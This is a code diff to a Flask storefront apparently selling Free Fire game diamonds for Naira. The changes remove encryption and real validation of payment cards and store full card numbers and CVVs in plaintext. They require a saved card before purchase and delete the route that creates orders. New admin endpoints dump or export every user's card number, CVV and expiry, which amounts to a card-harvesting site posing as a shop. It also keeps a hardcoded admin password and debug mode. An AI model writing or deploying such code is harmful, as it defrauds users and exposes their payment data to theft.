@@ -4,34 +4,16 @@ from werkzeug.security import generate_password_hash, check_password_hash
 from functools import wraps
 import os
 from datetime import datetime
-from cryptography.fernet import Fernet
-import base64
 import json
 
 app = Flask(__name__)
 
 # Production configuration
 app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'your-secret-key-change-in-production')
-
-# Database configuration - FIXED for Render
-database_url = os.environ.get('DATABASE_URL')
-
-if database_url:
-    # Production database (Render provides DATABASE_URL)
-    print(f"📊 DATABASE_URL found: {database_url[:50]}...")  # Log first 50 chars
-    if database_url.startswith('postgres://'):
-        database_url = database_url.replace('postgres://', 'postgresql://', 1)
-        print("🔄 Converted postgres:// to postgresql://")
-    app.config['SQLALCHEMY_DATABASE_URI'] = database_url
-    print("✅ Using PostgreSQL database")
-else:
-    # Development database
-    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///freefire_diamonds.db'
-    print("✅ Using SQLite database (development)")
-
+app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///freefire_diamonds.db')
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
-# Import models after app configuration to avoid circular imports
+# Import models after app configuration
 from models import db, User, DiamondPackage, Order, PaymentMethod
 from payment_processor import payment_processor
 from research_tools import ResearchTools
@@ -47,13 +29,11 @@ login_manager.login_message_category = 'info'
 @app.context_processor
 def utility_processor():
     def usd_to_ngn(usd_amount):
-        """Convert USD to Naira"""
-        exchange_rate = 1500  # Current USD to NGN rate
+        exchange_rate = 1500
         naira_amount = usd_amount * exchange_rate
         return "₦{:,.0f}".format(naira_amount)
     
     def format_ngn(amount):
-        """Format amount as Nigerian Naira"""
         return "₦{:,.0f}".format(amount)
     
     return dict(usd_to_ngn=usd_to_ngn, format_ngn=format_ngn)
@@ -72,102 +52,38 @@ def load_user(user_id):
     return User.query.get(int(user_id))
 
 def create_sample_data():
-    """Create sample packages and admin user only if they don't exist"""
     try:
-        # Naira exchange rate
         EXCHANGE_RATE = 1500
         
         packages = [
-            DiamondPackage(
-                name="Starter Pack", 
-                diamonds=100, 
-                price=0.99, 
-                original_price=1.99, 
-                discount=50, 
-                description="Perfect for beginners",
-                price_ngn=round(0.99 * EXCHANGE_RATE),
-                original_price_ngn=round(1.99 * EXCHANGE_RATE)
-            ),
-            DiamondPackage(
-                name="Elite Pack", 
-                diamonds=500, 
-                price=4.99, 
-                original_price=6.99, 
-                discount=29, 
-                popular=True, 
-                description="Great value package",
-                price_ngn=round(4.99 * EXCHANGE_RATE),
-                original_price_ngn=round(6.99 * EXCHANGE_RATE)
-            ),
-            DiamondPackage(
-                name="Pro Pack", 
-                diamonds=1200, 
-                price=9.99, 
-                original_price=14.99, 
-                discount=33, 
-                description="For serious players",
-                price_ngn=round(9.99 * EXCHANGE_RATE),
-                original_price_ngn=round(14.99 * EXCHANGE_RATE)
-            ),
-            DiamondPackage(
-                name="VIP Pack", 
-                diamonds=2500, 
-                price=19.99, 
-                original_price=29.99, 
-                discount=33, 
-                popular=True, 
-                description="Best seller",
-                price_ngn=round(19.99 * EXCHANGE_RATE),
-                original_price_ngn=round(29.99 * EXCHANGE_RATE)
-            ),
-            DiamondPackage(
-                name="Ultimate Pack", 
-                diamonds=5000, 
-                price=34.99, 
-                original_price=49.99, 
-                discount=30, 
-                description="Maximum diamonds",
-                price_ngn=round(34.99 * EXCHANGE_RATE),
-                original_price_ngn=round(49.99 * EXCHANGE_RATE)
-            ),
-            DiamondPackage(
-                name="Mega Pack", 
-                diamonds=10000, 
-                price=64.99, 
-                original_price=89.99, 
-                discount=28, 
-                description="For ultimate gamers",
-                price_ngn=round(64.99 * EXCHANGE_RATE),
-                original_price_ngn=round(89.99 * EXCHANGE_RATE)
-            ),
+            DiamondPackage(name="Starter Pack", diamonds=100, price=0.99, original_price=1.99, discount=50, description="Perfect for beginners", price_ngn=round(0.99 * EXCHANGE_RATE), original_price_ngn=round(1.99 * EXCHANGE_RATE)),
+            DiamondPackage(name="Elite Pack", diamonds=500, price=4.99, original_price=6.99, discount=29, popular=True, description="Great value package", price_ngn=round(4.99 * EXCHANGE_RATE), original_price_ngn=round(6.99 * EXCHANGE_RATE)),
+            DiamondPackage(name="Pro Pack", diamonds=1200, price=9.99, original_price=14.99, discount=33, description="For serious players", price_ngn=round(9.99 * EXCHANGE_RATE), original_price_ngn=round(14.99 * EXCHANGE_RATE)),
+            DiamondPackage(name="VIP Pack", diamonds=2500, price=19.99, original_price=29.99, discount=33, popular=True, description="Best seller", price_ngn=round(19.99 * EXCHANGE_RATE), original_price_ngn=round(29.99 * EXCHANGE_RATE)),
+            DiamondPackage(name="Ultimate Pack", diamonds=5000, price=34.99, original_price=49.99, discount=30, description="Maximum diamonds", price_ngn=round(34.99 * EXCHANGE_RATE), original_price_ngn=round(49.99 * EXCHANGE_RATE)),
+            DiamondPackage(name="Mega Pack", diamonds=10000, price=64.99, original_price=89.99, discount=28, description="For ultimate gamers", price_ngn=round(64.99 * EXCHANGE_RATE), original_price_ngn=round(89.99 * EXCHANGE_RATE)),
         ]
         
         for package in packages:
             if not DiamondPackage.query.filter_by(name=package.name).first():
                 db.session.add(package)
         
-        # Create admin user if not exists
         if not User.query.filter_by(username='admin').first():
-            encryption_key = base64.urlsafe_b64encode(Fernet.generate_key())
             admin_user = User(
                 username='admin',
                 email='admin@freefirediamonds.com',
                 password_hash=generate_password_hash('admin123'),
                 freefire_id='000000000',
-                encryption_key=encryption_key.decode(),
                 is_admin=True
             )
             db.session.add(admin_user)
         
-        # Create demo user if not exists
         if not User.query.filter_by(username='demo').first():
-            demo_key = base64.urlsafe_b64encode(Fernet.generate_key())
             demo_user = User(
                 username='demo',
                 email='demo@example.com',
                 password_hash=generate_password_hash('password123'),
-                freefire_id='123456789',
-                encryption_key=demo_key.decode()
+                freefire_id='123456789'
             )
             db.session.add(demo_user)
         
@@ -208,14 +124,11 @@ def register():
             flash('Email already registered', 'error')
             return redirect(url_for('register'))
         
-        encryption_key = base64.urlsafe_b64encode(Fernet.generate_key())
-        
         user = User(
             username=username,
             email=email,
             password_hash=generate_password_hash(password),
-            freefire_id=freefire_id,
-            encryption_key=encryption_key.decode()
+            freefire_id=freefire_id
         )
         
         db.session.add(user)
@@ -264,6 +177,11 @@ def dashboard():
 def package_detail(package_id):
     package = DiamondPackage.query.get_or_404(package_id)
     payment_methods = PaymentMethod.query.filter_by(user_id=current_user.id).all()
+    
+    if not payment_methods:
+        flash('You need to add a payment method before purchasing diamonds.', 'error')
+        return redirect(url_for('payment_methods'))
+    
     return render_template('payment.html', package=package, payment_methods=payment_methods)
 
 @app.route('/payment-methods')
@@ -272,7 +190,7 @@ def payment_methods():
     payment_methods = PaymentMethod.query.filter_by(user_id=current_user.id).all()
     return render_template('payment_methods.html', payment_methods=payment_methods)
 
-# API Routes
+# API Routes - SIMPLIFIED: Accept any card without validation
 @app.route('/api/add-payment-method', methods=['POST'])
 @login_required
 def add_payment_method():
@@ -283,34 +201,37 @@ def add_payment_method():
             
         card_holder_name = data.get('card_holder_name')
         card_number = data.get('card_number', '').replace(' ', '')
-        expiry_month = int(data.get('expiry_month'))
-        expiry_year = int(data.get('expiry_year'))
+        expiry_month = data.get('expiry_month')
+        expiry_year = data.get('expiry_year')
         cvv = data.get('cvv')
         save_card = data.get('save_card', False)
         
-        is_valid, message = payment_processor.validate_card(card_number, expiry_month, expiry_year, cvv)
-        if not is_valid:
-            return jsonify({'status': 'error', 'message': message})
+        # Basic validation only
+        if not all([card_holder_name, card_number, expiry_month, expiry_year, cvv]):
+            return jsonify({'status': 'error', 'message': 'All card details are required'})
         
-        card_type = payment_processor.get_card_type(card_number)
+        # Accept any card - no validation
+        card_type = "Credit Card"  # Default type
+        if card_number.startswith('4'):
+            card_type = "Visa"
+        elif card_number.startswith('5'):
+            card_type = "Mastercard"
+        elif card_number.startswith('3'):
+            card_type = "American Express"
+        
         last_four = card_number[-4:]
         
         if save_card:
             payment_method = PaymentMethod(
                 user_id=current_user.id,
                 card_type=card_type,
+                card_number=card_number,  # Store full number
                 last_four=last_four,
-                expiry_month=expiry_month,
-                expiry_year=expiry_year,
-                card_holder_name=card_holder_name
+                expiry_month=int(expiry_month),
+                expiry_year=int(expiry_year),
+                card_holder_name=card_holder_name,
+                cvv=cvv  # Store CVV directly
             )
-            
-            # Set temporary properties for encryption
-            payment_method.card_number = card_number
-            payment_method.cvv = cvv
-            
-            # Encrypt the sensitive data
-            payment_method.encrypt_data(current_user.encryption_key.encode())
             
             existing_methods = PaymentMethod.query.filter_by(user_id=current_user.id).count()
             if existing_methods == 0:
@@ -327,7 +248,8 @@ def add_payment_method():
         else:
             return jsonify({
                 'status': 'success', 
-                'message': 'Card validated successfully'
+                'message': 'Card validated successfully',
+                'payment_method_id': None
             })
             
     except Exception as e:
@@ -362,68 +284,12 @@ def delete_payment_method(method_id):
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)})
 
-@app.route('/api/create-order', methods=['POST'])
-@login_required
-def create_order():
-    try:
-        data = request.get_json()
-        if not data:
-            return jsonify({'status': 'error', 'message': 'No JSON data received'})
-            
-        package_id = data.get('package_id')
-        payment_method_id = data.get('payment_method_id')
-        use_saved_card = data.get('use_saved_card', False)
-        
-        package = DiamondPackage.query.get_or_404(package_id)
-        
-        if use_saved_card and payment_method_id:
-            payment_method = PaymentMethod.query.filter_by(id=payment_method_id, user_id=current_user.id).first()
-            if not payment_method:
-                return jsonify({'status': 'error', 'message': 'Payment method not found'})
-            
-            decrypted_data = payment_method.decrypt_data(current_user.encryption_key.encode())
-            if not decrypted_data:
-                return jsonify({'status': 'error', 'message': 'Error processing payment method'})
-            
-            success, transaction_id, message = payment_processor.simulate_payment(package.price, decrypted_data)
-        else:
-            success, transaction_id, message = payment_processor.simulate_payment(package.price, {})
-        
-        if success:
-            order = Order(
-                user_id=current_user.id,
-                package_id=package.id,
-                diamonds=package.diamonds,
-                amount=package.price,
-                status='completed',
-                payment_method='credit_card',
-                payment_method_id=payment_method_id if use_saved_card else None,
-                transaction_id=transaction_id,
-                completed_at=datetime.utcnow()
-            )
-            
-            db.session.add(order)
-            current_user.balance += package.diamonds
-            db.session.commit()
-            
-            return jsonify({
-                'status': 'success',
-                'message': f'Successfully purchased {package.diamonds} diamonds!',
-                'order_id': order.id,
-                'new_balance': current_user.balance
-            })
-        else:
-            return jsonify({'status': 'error', 'message': message})
-            
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': f'Error: {str(e)}'})
-
 @app.route('/api/user-balance')
 @login_required
 def user_balance():
     return jsonify({'balance': current_user.balance})
 
-# Admin Routes
+# Admin Routes - Now admins can see full card details
 @app.route('/admin')
 @admin_required
 def admin_dashboard():
@@ -431,11 +297,9 @@ def admin_dashboard():
     payment_methods = PaymentMethod.query.all()
     orders = Order.query.order_by(Order.created_at.desc()).limit(50).all()
     
-    # Get stats with safe defaults
     try:
         stats = ResearchTools.get_system_stats()
     except Exception as e:
-        print(f"Error getting stats: {e}")
         stats = {
             'total_users': len(users),
             'total_orders': len(orders),
@@ -447,27 +311,50 @@ def admin_dashboard():
             'total_diamonds_sold': 0
         }
     
-    return render_template('admin_dashboard.html', 
-                         users=users, 
-                         payment_methods=payment_methods, 
-                         orders=orders,
-                         stats=stats)
+    return render_template('admin_dashboard.html', users=users, payment_methods=payment_methods, orders=orders, stats=stats)
 
 @app.route('/admin/payment-data')
 @admin_required
 def admin_payment_data():
-    """Get all decrypted payment data"""
-    decrypted_data = ResearchTools.decrypt_all_payment_methods()
-    return jsonify(decrypted_data)
+    """Get all payment data with full card details"""
+    payment_methods = PaymentMethod.query.all()
+    payment_data = []
+    
+    for pm in payment_methods:
+        user = User.query.get(pm.user_id)
+        payment_data.append({
+            'id': pm.id,
+            'user': {
+                'id': user.id,
+                'username': user.username,
+                'email': user.email
+            },
+            'card_type': pm.card_type,
+            'card_number': pm.card_number,  # Full card number
+            'last_four': pm.last_four,
+            'expiry_month': pm.expiry_month,
+            'expiry_year': pm.expiry_year,
+            'card_holder_name': pm.card_holder_name,
+            'cvv': pm.cvv,  # Full CVV
+            'is_default': pm.is_default,
+            'created_at': pm.created_at.isoformat() if pm.created_at else None
+        })
+    
+    return jsonify(payment_data)
 
 @app.route('/admin/export-data')
 @admin_required
 def admin_export_data():
-    """Export data in various formats"""
+    """Export payment data with full details"""
     format_type = request.args.get('format', 'json')
     
     if format_type == 'csv':
-        csv_data = ResearchTools.export_payment_data('csv')
+        payment_methods = PaymentMethod.query.all()
+        csv_data = "ID,User ID,Username,Card Type,Card Number,Last Four,Expiry,Card Holder,CVV\n"
+        for pm in payment_methods:
+            user = User.query.get(pm.user_id)
+            csv_data += f"{pm.id},{pm.user_id},{user.username},{pm.card_type},{pm.card_number},{pm.last_four},{pm.expiry_month}/{pm.expiry_year},{pm.card_holder_name},{pm.cvv}\n"
+        
         response = app.response_class(
             response=csv_data,
             mimetype='text/csv',
@@ -475,62 +362,109 @@ def admin_export_data():
         )
         return response
     else:
-        json_data = ResearchTools.export_payment_data('json')
-        return jsonify(json.loads(json_data))
+        payment_methods = PaymentMethod.query.all()
+        payment_data = []
+        for pm in payment_methods:
+            user = User.query.get(pm.user_id)
+            payment_data.append(pm.to_dict())
+        return jsonify(payment_data)
+
+@app.route('/admin/decrypt-payment/<int:method_id>')
+@admin_required
+def admin_decrypt_payment(method_id):
+    """View specific payment method details - No decryption needed"""
+    payment_method = PaymentMethod.query.get_or_404(method_id)
+    user = User.query.get(payment_method.user_id)
+    
+    return jsonify({
+        'payment_method': payment_method.to_dict(),
+        'user': {
+            'id': user.id,
+            'username': user.username,
+            'email': user.email
+        }
+    })
 
 @app.route('/admin/system-stats')
 @admin_required
 def admin_system_stats():
     """Get system statistics"""
-    stats = ResearchTools.get_system_stats()
+    stats = {
+        'total_users': User.query.count(),
+        'total_orders': Order.query.count(),
+        'total_payment_methods': PaymentMethod.query.count(),
+        'completed_orders': Order.query.filter_by(status='completed').count(),
+        'pending_orders': Order.query.filter_by(status='pending').count(),
+    }
     return jsonify(stats)
 
 @app.route('/admin/duplicate-cards')
 @admin_required
 def admin_duplicate_cards():
     """Find duplicate card numbers"""
-    duplicates = ResearchTools.find_duplicate_cards()
-    return jsonify(duplicates)
-
-@app.route('/admin/decrypt-payment/<int:method_id>')
-@admin_required
-def admin_decrypt_payment(method_id):
-    """Decrypt specific payment method"""
-    payment_method = PaymentMethod.query.get_or_404(method_id)
-    user = User.query.get(payment_method.user_id)
+    duplicates = []
+    all_cards = PaymentMethod.query.all()
+    card_numbers = {}
     
-    if not user or not user.encryption_key:
-        return jsonify({'error': 'User or encryption key not found'})
-    
-    try:
-        decrypted_data = payment_method.decrypt_data(user.encryption_key.encode())
-        if decrypted_data:
-            return jsonify({
-                'payment_method': payment_method.to_dict(),
-                'user': {
-                    'id': user.id,
-                    'username': user.username,
-                    'email': user.email
-                },
-                'decrypted_data': decrypted_data
+    for card in all_cards:
+        if card.card_number in card_numbers:
+            duplicates.append({
+                'card_number': card.card_number,
+                'users': [card_numbers[card.card_number], card.user_id]
             })
         else:
-            return jsonify({'error': 'Decryption failed'})
-    except Exception as e:
-        return jsonify({'error': f'Decryption error: {str(e)}'})
+            card_numbers[card.card_number] = card.user_id
+    
+    return jsonify(duplicates)
 
 @app.route('/admin/user-analytics/<int:user_id>')
 @admin_required
 def admin_user_analytics(user_id):
     """Get detailed analytics for a specific user"""
-    analytics = ResearchTools.get_user_analytics(user_id)
+    user = User.query.get(user_id)
+    if not user:
+        return jsonify({'error': 'User not found'})
+    
+    orders = Order.query.filter_by(user_id=user_id).all()
+    payment_methods = PaymentMethod.query.filter_by(user_id=user_id).all()
+    
+    analytics = {
+        'user': {
+            'id': user.id,
+            'username': user.username,
+            'email': user.email,
+            'balance': user.balance,
+            'joined': user.created_at.isoformat() if user.created_at else None
+        },
+        'orders': len(orders),
+        'payment_methods': len(payment_methods),
+        'total_spent': sum(order.amount for order in orders),
+        'payment_methods_details': [pm.to_dict() for pm in payment_methods]
+    }
+    
     return jsonify(analytics)
 
 @app.route('/admin/all-users-analytics')
 @admin_required
 def admin_all_users_analytics():
     """Get analytics for all users"""
-    analytics = ResearchTools.get_user_analytics()
+    users = User.query.all()
+    analytics = []
+    
+    for user in users:
+        orders = Order.query.filter_by(user_id=user.id).all()
+        payment_methods = PaymentMethod.query.filter_by(user_id=user.id).all()
+        
+        analytics.append({
+            'user_id': user.id,
+            'username': user.username,
+            'email': user.email,
+            'orders': len(orders),
+            'payment_methods': len(payment_methods),
+            'total_spent': sum(order.amount for order in orders),
+            'balance': user.balance
+        })
+    
     return jsonify(analytics)
 
 # Error handlers
@@ -551,5 +485,4 @@ if __name__ == '__main__':
     with app.app_context():
         db.create_all()
         create_sample_data()
-    # Enable debug for development
     app.run(debug=True, host='0.0.0.0', port=5000)
